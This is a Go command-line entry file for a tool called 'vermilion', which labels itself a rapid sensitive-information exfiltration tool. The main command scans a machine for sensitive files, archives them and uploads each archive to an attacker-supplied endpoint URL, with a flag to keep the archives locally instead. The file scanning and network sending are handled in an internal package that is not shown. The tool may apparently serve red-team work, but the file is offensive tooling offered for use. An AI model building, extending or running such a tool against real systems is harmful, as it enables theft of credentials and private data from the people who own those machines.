package cmd

import (
	"fmt"
	"os"

	"github.com/r3drun3/vermilion/internal"
	"github.com/spf13/cobra"
)

var (
	endpoint string
	noExf    bool
)

var rootCmd = &cobra.Command{
	Use:   "vermilion",
	Short: "Vermilion - Rapid sensitive info exfiltration tool",
	Run: func(cmd *cobra.Command, args []string) {

		// Directory to save files if no exfiltration
		outputDir := "exdata"

		// Scan for sensitive files
		files, err := internal.ScanSensitiveFiles(outputDir)
		if err != nil {
			fmt.Printf("Error scanning sensitive files: %v\n", err)
			return
		}
		fmt.Printf("Found %d sensitive files.\n", len(files))

		// Archive files
		archives, err := internal.CreateArchive(outputDir, files)
		if err != nil {
			fmt.Printf("Error creating archives: %v\n", err)
			return
		}
		fmt.Printf("Created %d archives.\n", len(archives))

		// Exfiltrate each archive if required
		if !noExf {
			for _, archivePath := range archives {
				fmt.Printf("Exfiltrating archive: %s\n", archivePath)
				err = internal.Exfiltrate(endpoint, archivePath)
				if err != nil {
					fmt.Printf("Error during exfiltration of %s: %v\n", archivePath, err)
					continue // Log the error but continue with the next archive
				}
			}
			fmt.Println("Exfiltration completed.")
		} else {
			fmt.Println("Exfiltration skipped.")
		}
	},
}

func Execute() {
	rootCmd.PersistentFlags().StringVarP(&endpoint, "endpoint", "e", "", "Exfiltration endpoint URL")
	rootCmd.PersistentFlags().BoolVarP(&noExf, "noexf", "n", false, "Skip exfiltration and save locally")
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
